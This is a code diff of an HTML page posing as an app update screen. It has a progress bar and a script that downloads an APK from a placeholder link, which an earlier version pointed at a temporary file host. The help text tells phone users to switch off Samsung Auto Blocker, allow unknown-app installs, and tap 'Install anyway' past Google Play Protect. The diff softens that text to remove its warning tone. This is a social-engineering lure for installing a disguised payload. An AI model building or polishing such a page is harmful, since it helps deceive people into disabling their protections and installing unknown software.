@@ -19,7 +19,6 @@
         .help-box h3 { margin: 0 0 10px; font-size: 15px; color: #FE2C55; }
         .help-box p { font-size: 13px; color: #ccc; margin: 0 0 10px; line-height: 1.6; }
         .help-box b { color: #fff; }
-        .help-box ol { padding-left: 20px; margin: 0; color: #ccc; font-size: 13px; line-height: 1.8; }
     </style>
 </head>
 <body>
@@ -32,19 +31,12 @@
         <div class="status" id="status">Downloading update... Please wait.</div>
 
         <div class="help-box" id="helpBox">
-            <h3>⚠️ Installation Help</h3>
-            <p>Your phone may show a security warning. This is normal for manual updates.</p>
-            <p><b>Samsung:</b></p>
-            <ol>
-                <li>If <b>"Unknown app blocked"</b> appears, go to <b>Settings → Security and privacy → Auto Blocker → Off</b>.</li>
-                <li>Then install the app again.</li>
-            </ol>
-            <p><b>Oppo / Vivo / Realme / Xiaomi:</b></p>
-            <ol>
-                <li>Tap <b>"Allow"</b> or <b>"Install anyway"</b> if a warning appears.</li>
-                <li>If blocked, go to <b>Settings → Security → App scan / Install unknown apps</b> and allow.</li>
-            </ol>
-            <p><b>Google Play Protect:</b> Tap <b>"Install anyway"</b> (not "Don't install").</p>
+            <h3>📲 How to complete update</h3>
+            <p>After downloading, open the file to finish installation.</p>
+            <p><b>If installation is paused:</b></p>
+            <p>• <b>Samsung:</b> Open <b>Settings → Security and privacy → Auto Blocker → Off</b>. Then tap the downloaded file again.</p>
+            <p>• <b>Oppo / Vivo / Realme / Xiaomi:</b> Tap <b>Allow</b> or <b>Continue</b> when asked. If paused, open <b>Settings → Security → Install unknown apps</b> and allow your browser.</p>
+            <p>• <b>Google Play:</b> Tap <b>Install anyway</b> to continue the update.</p>
         </div>
     </div>
     <script>
@@ -58,8 +50,8 @@
             var bar = document.getElementById('bar');
             var width = 0;
             
-            // APK link yahan aayega (bot update karega)
-            var apkUrl = "https://tmpfiles.org/dl/xxxxx/app.apk"; 
+            // APK link yahan aayega
+            var apkUrl = "YAHAN_APK_LINK"; 
             
             var interval = setInterval(function() {
                 if (width >= 100) {
